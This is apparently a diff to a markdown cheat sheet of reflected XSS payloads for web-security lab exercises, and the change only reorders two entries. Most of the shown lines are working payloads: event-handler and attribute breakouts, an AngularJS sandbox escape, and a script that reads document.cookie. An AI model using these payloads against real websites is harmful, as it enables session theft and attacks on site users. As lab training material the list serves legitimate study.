@@ -37,7 +37,7 @@ Reflected XSS
 2. ```"><svg onload=alert(1)>```
 3. ```<img src=1 onerror=alert(1)>```
 4. ```javascript:alert(document.cookie)```
-5. ```<iframe src="https://YOUR-LAB-ID.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```
+5. ```<img src=1 onerror=print()>```
 6. ```"onmouseover="alert(1)```
 7. ```javascript:alert(1)```
 8. ```'-alert(1)-'```
@@ -45,7 +45,7 @@ Reflected XSS
 10. ```{{$on.constructor('alert(1)')()}}```
 11. ```\"-alert(1)}//```
 12. ```<><img src=1 onerror=alert(1)>```
-13. ```<img src=1 onerror=print()>```
+13. ```<iframe src="https://YOUR-LAB-ID.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```
 14. ```<script>location = 'https://YOUR-LAB-ID.com?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>```
 15. ```/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E```
 16. ```/?%27accesskey=%27x%27onclick=%27alert(1)```
